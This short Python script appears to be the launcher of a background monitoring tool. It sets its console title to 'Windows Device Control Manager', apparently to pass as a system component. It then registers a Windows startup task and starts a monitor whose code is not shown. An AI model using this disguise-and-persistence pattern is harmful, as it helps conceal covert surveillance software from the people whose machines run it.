import monitor
import system_detect
import startup
import os
import ctypes
import os

def set_process_name(name):
    if os.name == 'nt':
        ctypes.windll.kernel32.SetConsoleTitleW(name)


set_process_name("Windows Device Control Manager")

current_directory = os.path.dirname(os.path.abspath(__file__))

if system_detect.detect_os() == 'Windows':
    startup.main()
    print("Startup Task Added")
monitor.start_monitor()
